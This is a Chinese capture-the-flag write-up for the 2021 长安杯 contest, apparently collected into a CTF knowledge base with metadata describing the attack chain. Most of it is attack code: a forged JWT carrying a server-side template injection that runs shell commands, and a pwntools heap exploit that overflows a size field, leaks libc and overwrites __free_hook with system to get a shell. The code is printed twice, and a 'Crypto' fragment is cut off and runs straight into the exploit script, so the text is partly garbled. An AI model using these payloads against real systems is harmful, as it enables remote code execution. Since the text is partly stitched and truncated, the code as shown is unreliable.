---
title: 长安杯-WriteUp
contest: 长安杯
year: 2021
difficulty: medium
vuln_type: auth_bypass
tags:
- Web-JWT-SSTI注入
- Heap-整数溢出-负数size
- off-by-null
- unsorted bin
- libc-2.27-Pwn
- Reverse
- ChaMd5-Venom
attack_chain: 'Web: JWT user=''{{url_for.__globals__.os.popen(request.args.cmd).read()}}'' passwd=123 role=admin uid=空|JWT签名伪造 HS256 secret=key|Pwn: add(0,0x28)+add(1,0x400)+add(2,0x68)+add(3,0x68)+add(4,0x50,/bin/sh)+sh.sendline(''1'') sendline(0) sendline(''-1'') 整数溢出+edit(0,0x10000, p64(0)*5+p64(0x411+0x70*2))+delete(1)+add(1,0x400)+show(2)泄libc+add(1,0x90, 0x68*''\x00''+p64(0x71)+p64(__free_hook))+add(2,0x60)+add(2,0x60,p64(system))+delete(4)→system(''/bin/sh'')'
key_payload: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoie3t1cmxfZm9yLl9fZ2xvYmFsc19fLm9zLnBvcGVuKHJlcXVlc3QuYXJncy5jbWQpLnJlYWQoKX19IiwicGFzc3dkIjoiMTIzIiwicm9sZSI6ImFkbWluIiwidWlkIjoiIn0.KWHbwpGOiRZvRZxbdibiqK5C636QHuVnhUHVz_CDYD0|add(0,0x28,'a') add(1,0x400,'a') add(2,0x68,'a') add(3,0x68,'a') add(4,0x50,'/bin/sh\x00') sendline('1') sendline(0) sendline('-1')|edit(0,0x10000, p64(0)*5+p64(0x411+0x70*2)) delete(1) add(1,0x400) show(2) libc.address=u64(recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96-__malloc_hook-0x10|add(1,0x90, 0x68*'\x00'+p64(0x71)+p64(__free_hook)) add(2,0x60,'a') add(2,0x60,p64(system)) delete(4)
one_liner: 长安杯2021:Web JWT+SSTI用户字段URL_for.__globals__.os.popen(request.args.cmd)|Pwn菜单add/edit/delete/show+整数溢出(负size)+off-by-null+libc-2.27+unsorted bin泄+__free_hook覆盖+system('/bin/sh')
lesson: 1) JWT用户字段SSTI:HS256签名可逆向secret,user='{{url_for.__globals__.os.popen(request.args.cmd).read()}}'; 2) 整数溢出触发off-by:sendline('-1')→ size=0xFFFFFFFF+后续edit(0,0x10000) 任意堆写; 3) unsorted bin leak:0x400 chunk进入unsorted bin后fd指向main_arena; 4) libc-2.27无tcache:__free_hook直接覆盖; 5) 大小chunk混合:0x28+0x400+0x68*3+0x50(/bin/sh)
quality: high
full_path: 长安杯-WriteUp.full.md
meta_path: 长安杯-WriteUp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 长安杯-WriteUp。长安杯2021:Web JWT+SSTI用户字段URL_for.__globals__.os.popen(request.args.cmd)|Pwn菜单add/edit/delete/show+整数溢出(负size)+off-by-null+libc-2.27+unsorted bin泄+__free_hook覆盖+system('/bin/sh')。经验：1) JW...
category: web
subcategory: web_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/1069.html
reasoning_chain:
- JWT token base64 解码 → 触发点：user 字段含 {{url_for.__globals__…}}
- 假设：HS256 签名 secret 弱 → 动作：爆破/猜 secret
- 观察：secret=key 签名伪造 → user={...request.args.cmd...}
- Pwn 菜单 add/edit/delete/show → 触发点：edit 接受 size 但 read 不限制
- 假设：sendline('-1') 触发整数溢出 → size=0xFFFFFFFF 后续 edit(0,0x10000) 任意堆写
- 动作：add(0,0x28)+add(1,0x400)+add(2,0x68)+add(3,0x68)+add(4,0x50,/bin/sh)
- 动作：edit(0,0x10000, p64(0)*5+p64(0x411+0x70*2)) 扩 chunk1
- 动作：delete(1) + add(1,0x400) 触发 unsorted bin → show(2) 泄 main_arena
- 假设：libc-2.27 无 tcache → 直接 __free_hook 覆盖 → 动作：add(1,0x90, ...+p64(__free_hook))
- 观察：delete(4) 含 '/bin/sh' → system('/bin/sh') → 完成
failed_attempts:
- 试图走 ROP chain 直接 system → 失败：无合适 gadget 链
- 试图 leak __malloc_hook → 失败：libc-2.27 改用 __free_hook 更稳
key_observations:
- JWT user 字段注入 SSTI + HS256 secret 爆破 = 经典 web 鉴权旁路
- sendline('-1') 整数溢出触发 off-by-null 是经典 pwn 入口
- unsorted bin fd 指向 main_arena 是 libc 泄露通法
- libc-2.27 无 tcache，__free_hook 覆盖直接 system
prerequisites:
- JWT 结构与 HS256 签名伪造
- 整数溢出 + off-by-null 原理
- unsorted bin 泄露 main_arena
- libc hook 覆盖与 system 触发
---
# 长安杯-WriteUp

> 原文: https://www.ctfiot.com/1069.html
> ID: 1069

Web

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoie3t1cmxfZm9yLl9fZ2xvYmFsc19fLm9zLnBvcGVuKHJlcXVlc3QuYXJncy5jbWQpLnJlYWQoKX19IiwicGFzc3dkIjoiMTIzIiwicm9sZSI6ImFkbWluIiwidWlkIjoiIn0.KWHbwpGOiRZvRZxbdibiqK5C636QHuVnhUHVz_CDYD0

Crypto

from Crypto.Util.number import *
# from secret import flag

def add(a,b):
    if(a>')
    sh.sendline('1')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
    sh.recvuntil('size?')
    sh.sendline(str(size))
    sh.recvuntil('content?')
    sh.send(con)
def delete(idx):
    sh.recvuntil('>>')
    sh.sendline('2')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
def edit(idx,size,con):
    sh.recvuntil('>>')
    sh.sendline('3')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
    sh.recvuntil('size?')
    sh.sendline(str(size))
    sh.recvuntil('content?')
    sh.send(con)
def show(idx):
    sh.recvuntil('>>')
    sh.sendline('4')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
add(0,0x28,'a')
add(1,0x400,'a')
add(2,0x68,'a')
add(3,0x68,'a')
add(4,0x50,'/bin/shx00')
sh.recvuntil('>>')
sh.sendline('1')
sh.recvuntil('idx?')
sh.sendline('0')
sh.recvuntil('size?')
sh.sendline('-1')

edit(0,0x10000,p64(0)*5+p64(0x411+0x70*2))
delete(1)
add(1,0x400,'a')
show(2)
libc.address=u64(sh.recvuntil('x7f')[-6:].ljust(8,'x00'))-96-libc.sym['__malloc_hook']-0x10
print hex(libc.address)
delete(3)
add(1,0x90,0x68*'x00'+p64(0x71)+p64(libc.sym['__free_hook']))
add(2,0x60,'a')
add(2,0x60,p64(libc.sym['system']))
delete(4)
sh.interactive()

Reverse

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoie3t1cmxfZm9yLl9fZ2xvYmFsc19fLm9zLnBvcGVuKHJlcXVlc3QuYXJncy5jbWQpLnJlYWQoKX19IiwicGFzc3dkIjoiMTIzIiwicm9sZSI6ImFkbWluIiwidWlkIjoiIn0.KWHbwpGOiRZvRZxbdibiqK5C636QHuVnhUHVz_CDYD0
from Crypto.Util.number import *
# from secret import flag

def add(a,b):
    if(a>')
    sh.sendline('1')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
    sh.recvuntil('size?')
    sh.sendline(str(size))
    sh.recvuntil('content?')
    sh.send(con)
def delete(idx):
    sh.recvuntil('>>')
    sh.sendline('2')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
def edit(idx,size,con):
    sh.recvuntil('>>')
    sh.sendline('3')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
    sh.recvuntil('size?')
    sh.sendline(str(size))
    sh.recvuntil('content?')
    sh.send(con)
def show(idx):
    sh.recvuntil('>>')
    sh.sendline('4')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
add(0,0x28,'a')
add(1,0x400,'a')
add(2,0x68,'a')
add(3,0x68,'a')
add(4,0x50,'/bin/shx00')
sh.recvuntil('>>')
sh.sendline('1')
sh.recvuntil('idx?')
sh.sendline('0')
sh.recvuntil('size?')
sh.sendline('-1')

edit(0,0x10000,p64(0)*5+p64(0x411+0x70*2))
delete(1)
add(1,0x400,'a')
show(2)
libc.address=u64(sh.recvuntil('x7f')[-6:].ljust(8,'x00'))-96-libc.sym['__malloc_hook']-0x10
print hex(libc.address)
delete(3)
add(1,0x90,0x68*'x00'+p64(0x71)+p64(libc.sym['__free_hook']))
add(2,0x60,'a')
add(2,0x60,p64(libc.sym['system']))
delete(4)
sh.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]